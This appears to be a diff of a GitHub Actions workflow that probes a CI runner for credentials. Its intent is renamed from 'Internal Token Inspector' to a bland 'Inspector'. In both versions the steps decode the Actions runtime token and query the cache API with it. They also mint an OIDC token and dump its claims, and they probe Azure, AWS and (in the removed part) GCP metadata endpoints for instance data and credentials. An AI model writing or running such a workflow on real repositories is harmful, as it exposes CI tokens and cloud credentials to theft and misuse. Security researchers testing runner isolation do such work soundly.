@@ -1,4 +1,4 @@
-name: Internal Token Inspector
+name: Inspector
 on:
   workflow_dispatch:
 permissions:
@@ -8,73 +8,33 @@ jobs:
   inspect:
     runs-on: ubuntu-latest
     steps:
-      - name: Capture internal Actions service credentials
+      - name: Internal URLs and runtime token
         run: |
-          echo "=== ACTIONS INTERNAL SERVICE URLS ==="
-          echo "ACTIONS_RUNTIME_URL: $ACTIONS_RUNTIME_URL"
-          echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL"
-          echo "ACTIONS_RESULTS_URL: ${ACTIONS_RESULTS_URL:-NOT_SET}"
-          echo "RUNNER_ENVIRONMENT: $RUNNER_ENVIRONMENT"
-          echo "GITHUB_RUN_ID: $GITHUB_RUN_ID"
-          echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
+          echo "=== INTERNAL URLS ==="
+          echo "RUNTIME_URL: $ACTIONS_RUNTIME_URL"
+          echo "CACHE_URL: $ACTIONS_CACHE_URL"
+          echo "RESULTS_URL: ${ACTIONS_RESULTS_URL:-NOT_SET}"
+          echo "RUN_ID: $GITHUB_RUN_ID"
           echo ""
-          echo "=== ACTIONS_RUNTIME_TOKEN JWT HEADER+CLAIMS ==="
-          echo "$ACTIONS_RUNTIME_TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool || echo "header decode failed"
-          echo "$ACTIONS_RUNTIME_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool || true
+          echo "=== RUNTIME TOKEN DECODE ==="
+          echo $ACTIONS_RUNTIME_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(k,':',v) for k,v in d.items()]" 2>/dev/null || echo "decode failed"
           echo ""
-          echo "=== PROBE: Direct cache API (what is accessible?) ==="
-          curl -sf -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-            "${ACTIONS_CACHE_URL}_apis/artifactcache/cache?keys=test&version=1" \
-            -w "
-HTTP Status: %{http_code}
-" 2>&1 | head -20
+          echo "=== CACHE API PROBE ==="
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            "${ACTIONS_CACHE_URL}_apis/artifactcache/cache?keys=Linux-node-&version=1"
           echo ""
-          echo "=== PROBE: Cache API list all entries ==="
-          curl -sf -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-            "${ACTIONS_CACHE_URL}_apis/artifactcache/caches?top=5" \
-            -w "
-HTTP Status: %{http_code}
-" 2>&1 | head -20
+          curl -s -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            "${ACTIONS_CACHE_URL}_apis/artifactcache/caches?top=5"
 
-      - name: Get OIDC token and inspect claims
-        id: oidc
+      - name: OIDC token claims
         run: |
-          echo "=== OIDC TOKEN CLAIMS ==="
-          OIDC_TOKEN=$(curl -sf \
-            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sigstore" | jq -r '.value')
-          echo "$OIDC_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool
-          echo ""
-          echo "=== OIDC issuer_scope claim ==="
-          echo "$OIDC_TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '.issuer_scope // "NOT PRESENT"'
-          echo ""
-          echo "=== OIDC with audience: https://token.actions.githubusercontent.com ==="
-          OIDC2=$(curl -sf \
-            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Ftoken.actions.githubusercontent.com" | jq -r '.value // "FAILED"')
-          echo "audience=github: ${OIDC2:0:30}..."
+          echo "=== OIDC CLAIMS ==="
+          T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sigstore" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
+          echo $T | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(k,':',v) for k,v in d.items()]"
 
-      - name: Probe Azure IMDS (cloud metadata from runner)
+      - name: Cloud IMDS probe
         run: |
-          echo "=== Azure IMDS probe (169.254.169.254) ==="
-          curl -sf --connect-timeout 3 \
-            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
-            -H "Metadata: true" \
-            -w "
-HTTP: %{http_code}
-" 2>&1 | head -10 || echo "IMDS blocked or timeout"
-          echo ""
-          echo "=== AWS IMDS probe ==="
-          curl -sf --connect-timeout 3 \
-            "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
-            -w "
-HTTP: %{http_code}
-" 2>&1 | head -5 || echo "AWS IMDS blocked"
-          echo ""
-          echo "=== GCP metadata ==="
-          curl -sf --connect-timeout 3 \
-            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
-            -H "Metadata-Flavor: Google" \
-            -w "
-HTTP: %{http_code}
-" 2>&1 | head -5 || echo "GCP metadata blocked"
+          echo "=== IMDS PROBE ==="
+          curl -s --max-time 3 http://169.254.169.254/metadata/instance -H "Metadata: true" && echo "(azure imds ok)" || echo "azure imds: blocked"
+          curl -s --max-time 3 http://169.254.169.254/latest/meta-data/ && echo "(aws imds ok)" || echo "aws imds: blocked"
